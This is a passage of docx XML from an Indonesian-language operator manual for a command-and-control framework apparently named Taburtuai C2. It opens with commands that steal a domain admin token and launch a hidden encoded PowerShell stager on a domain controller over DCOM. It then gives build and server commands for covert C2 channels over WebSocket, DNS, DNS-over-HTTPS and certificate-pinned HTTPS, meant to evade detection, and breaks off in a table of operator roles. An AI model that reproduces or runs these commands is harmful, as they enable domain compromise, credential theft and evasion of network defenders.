    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token steal &lt;agent-id&gt; --pid &lt;DA_PID&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 4:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Eksekusi DCOM ke DC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral dcom &lt;agent-id&gt; &lt;DC_IP&gt; "powershell -w hidden -enc &lt;B64_STAGER&gt;" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 5:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Tunggu agent baru dari DC muncul di console.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 6:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Verifikasi konteks di agent DC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;DC_AGENT_ID&gt; "whoami" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 16 — ADVANCED TRANSPORTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Transport alternatif digunakan ketika HTTP/HTTPS standar diblokir atau terlalu mudah dideteksi. Setiap transport memanfaatkan protokol berbeda sebagai covert channel.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>WebSocket — Latensi Rendah</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Server setup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/server --ws --ws-port 8081</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Build agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>make agent-win-ws \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  C2_SERVER=http://IP:8080 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=Key \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  TRANSPORT=ws</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Agent konek sekali, server push command tanpa harus tunggu beacon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Latensi: &lt;1 detik vs 30 detik (HTTP polling)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>DNS Authoritative</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Agent mengirim data via DNS TXT query ke server yang bertindak sebagai authoritative DNS server. Traffic terlihat seperti DNS lookup biasa.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Server setup (butuh domain yang dikuasai)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/server \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --dns \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --dns-domain c2.yourdomain.com \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --dns-port 5353</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Build agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>make agent-win-dns \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  C2_SERVER=http://IP:8080 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=Key \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  TRANSPORT=dns \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  DNS_DOMAIN=c2.yourdomain.com \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  DNS_SERVER=&lt;SERVER_IP&gt;:5353</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>DNS-over-HTTPS (DoH)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Tidak perlu setup server khusus</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Agent mengirim query ke Cloudflare/Google yang forward ke server C2</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make agent-win-doh \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  C2_SERVER=c2.yourdomain.com \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=Key \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  TRANSPORT=doh \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  DOH_PROVIDER=cloudflare \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  INTERVAL=120</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Certificate Pinning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dapatkan fingerprint sertifikat server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>openssl s_client -connect IP:8443 &lt;/dev/null 2&gt;/dev/null \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  | openssl x509 -fingerprint -sha256 -noout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Build agent dengan pin</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C2_SERVER=https://IP:8443 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=Key \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  CERT_PIN=aabbcc...(64 hex chars)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 17 — MULTI-OPERATOR TEAM SERVER (RBAC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Taburtuai C2 mendukung operasi multi-operator dengan Role-Based Access Control (RBAC). Setiap operator memiliki role berbeda dengan level akses berbeda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Roles</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Role</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Akses</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>3 (tertinggi)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Semua operasi, termasuk promote/demote operator lain</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>operator</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Eksekusi command, inject, creds, lateral movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>viewer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Hanya bisa melihat agent list dan output</w:t>
